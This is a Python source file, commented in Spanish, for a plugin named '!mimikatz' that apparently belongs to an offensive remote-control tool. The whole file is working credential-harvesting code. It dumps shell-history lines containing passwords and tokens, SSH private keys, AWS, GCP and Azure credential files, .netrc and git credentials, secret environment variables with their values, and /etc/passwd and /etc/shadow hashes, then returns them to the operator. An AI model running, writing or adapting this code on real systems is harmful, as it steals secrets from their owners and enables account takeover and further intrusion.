"""
Plugin !mimikatz — recolección de credenciales en sistemas Linux.
Busca: historial de shell, claves SSH privadas, tokens de nube,
credenciales en archivos de config y hashes del sistema.
"""

import os


_HIST_KEYWORDS = [
    "password", "passwd", "secret", "token", "apikey", "api_key",
    "mysql", "psql", "mongo", "redis", "ssh -p", "--password",
    "Authorization", "Bearer", "PRIVATE",
]


def _grep_sensitive(lines: list[str], limit: int = 30) -> list[str]:
    kws = [k.lower() for k in _HIST_KEYWORDS]
    return [l.strip() for l in lines if any(k in l.lower() for k in kws)][:limit]


def run(args: str) -> tuple[int, str, str]:
    findings: list[str] = []
    home = os.path.expanduser("~")

    # ── Shell history ──────────────────────────────────────────────────────────
    for hist in [".bash_history", ".zsh_history", ".sh_history", ".fish_history"]:
        path = os.path.join(home, hist)
        if not os.path.isfile(path):
            continue
        try:
            with open(path, errors="replace") as f:
                lines = f.readlines()
            hits = _grep_sensitive(lines)
            if hits:
                findings.append(f"\n[+] {hist} — {len(hits)} entradas sensibles:")
                findings.extend(f"    {l}" for l in hits)
        except PermissionError:
            findings.append(f"\n[-] {hist}: sin permisos")

    # ── SSH private keys ───────────────────────────────────────────────────────
    ssh_dir = os.path.join(home, ".ssh")
    if os.path.isdir(ssh_dir):
        for fname in os.listdir(ssh_dir):
            if fname in ("known_hosts", "authorized_keys", "config") or fname.endswith(".pub"):
                continue
            fpath = os.path.join(ssh_dir, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, errors="replace") as f:
                    content = f.read(4096)
                if "PRIVATE KEY" in content:
                    findings.append(f"\n[+] Clave privada SSH: {fpath}")
                    findings.append(content)
            except PermissionError:
                findings.append(f"\n[-] {fpath}: sin permisos")

    # ── Credenciales de nube ───────────────────────────────────────────────────
    cloud_files = {
        "AWS": os.path.join(home, ".aws", "credentials"),
        "GCP": os.path.join(home, ".config", "gcloud", "credentials.db"),
        "Azure": os.path.join(home, ".azure", "accessTokens.json"),
    }
    for provider, path in cloud_files.items():
        if os.path.isfile(path):
            try:
                with open(path, errors="replace") as f:
                    findings.append(f"\n[+] {provider} credentials ({path}):")
                    findings.append(f.read(2048))
            except PermissionError:
                findings.append(f"\n[-] {provider} credentials: sin permisos")

    # ── .netrc / git credentials ───────────────────────────────────────────────
    for cred_file in [".netrc", ".git-credentials"]:
        path = os.path.join(home, cred_file)
        if os.path.isfile(path):
            try:
                with open(path, errors="replace") as f:
                    content = f.read(2048)
                findings.append(f"\n[+] {cred_file}:")
                findings.append(content)
            except PermissionError:
                pass

    # ── Variables de entorno sensibles ────────────────────────────────────────
    env_hits = {k: v for k, v in os.environ.items()
                if any(kw in k.lower() for kw in ["pass", "secret", "token", "key", "api", "auth"])}
    if env_hits:
        findings.append("\n[+] Variables de entorno sensibles:")
        for k, v in env_hits.items():
            findings.append(f"    {k}={v}")

    # ── /etc/passwd ───────────────────────────────────────────────────────────
    try:
        with open("/etc/passwd", errors="replace") as f:
            content = f.read()
        users = [l for l in content.splitlines() if not l.startswith("#") and "/bin/" in l]
        findings.append(f"\n[+] /etc/passwd — usuarios con shell ({len(users)}):")
        findings.extend(f"    {u}" for u in users)
    except PermissionError:
        findings.append("\n[-] /etc/passwd: sin permisos")

    # ── /etc/shadow ───────────────────────────────────────────────────────────
    try:
        with open("/etc/shadow", errors="replace") as f:
            content = f.read()
        hashes = [l for l in content.splitlines()
                  if ":" in l and not l.startswith("*")
                  and len(l.split(":")) > 1 and "!!" not in l.split(":")[1]]
        if hashes:
            findings.append(f"\n[+] /etc/shadow — {len(hashes)} hashes recuperables:")
            findings.extend(f"    {h}" for h in hashes)
    except PermissionError:
        findings.append("\n[-] /etc/shadow: sin permisos (requiere root)")

    if not findings:
        return 0, "No se encontraron credenciales accesibles", ""

    return 0, "\n".join(findings), ""
